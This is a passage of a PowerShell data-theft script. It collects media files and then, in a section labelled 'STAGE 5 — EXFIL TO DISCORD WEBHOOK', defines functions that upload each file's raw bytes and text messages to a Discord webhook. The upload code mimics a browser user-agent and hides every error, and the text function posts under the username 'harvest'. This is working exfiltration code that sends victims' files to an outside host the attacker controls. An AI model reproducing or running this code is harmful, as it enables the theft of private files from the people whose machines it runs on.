            Where-Object { $_.Length -le $maxBytes -and $_.Length -gt 0 } |
            ForEach-Object { $mediaFiles.Add($_) }
    }
}

# ─────────────────────────────────────────────────────────────────
# STAGE 5 — EXFIL TO DISCORD WEBHOOK
# Discord multipart upload: POST multipart/form-data with file attachments
# ─────────────────────────────────────────────────────────────────
function Send-DiscordFile([string]$wh, [string]$filePath, [string]$caption) {
    if (-not (Test-Path $filePath)) { return }
    try {
        $boundary = [Guid]::NewGuid().ToString('N')
        $fileName = [IO.Path]::GetFileName($filePath)
        $fileBytes = [IO.File]::ReadAllBytes($filePath)

        # Build multipart body manually (PS doesn't have native multipart for IRM pre-7)
        $body = [IO.MemoryStream]::new()
        $enc  = [Text.Encoding]::UTF8

        # -- payload_json part
        $jsonPart = "--$boundary`r`nContent-Disposition: form-data; name=`"payload_json`"`r`nContent-Type: application/json`r`n`r`n" +
                    "{`"content`":`"$caption`"}`r`n"
        $jsonBytes = $enc.GetBytes($jsonPart)
        $body.Write($jsonBytes, 0, $jsonBytes.Length)

        # -- file part
        $filePart = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
        $filePartBytes = $enc.GetBytes($filePart)
        $body.Write($filePartBytes, 0, $filePartBytes.Length)
        $body.Write($fileBytes, 0, $fileBytes.Length)

        $end = $enc.GetBytes("`r`n--$boundary--`r`n")
        $body.Write($end, 0, $end.Length)
        $bodyBytes = $body.ToArray()

        $req = [Net.HttpWebRequest]::Create($wh)
        $req.Method      = 'POST'
        $req.ContentType = "multipart/form-data; boundary=$boundary"
        $req.ContentLength = $bodyBytes.Length
        $req.UserAgent   = 'Mozilla/5.0'
        $req.Timeout     = 30000

        $stream = $req.GetRequestStream()
        $stream.Write($bodyBytes, 0, $bodyBytes.Length)
        $stream.Close()
        $req.GetResponse() | Out-Null
    } catch {}
}

function Send-DiscordText([string]$wh, [string]$content, [string]$username='harvest') {
    try {
        $body = @{ username=$username; content=$content } | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $body `
            -ContentType 'application/json' -UseBasicParsing -EA Stop
    } catch {}
}

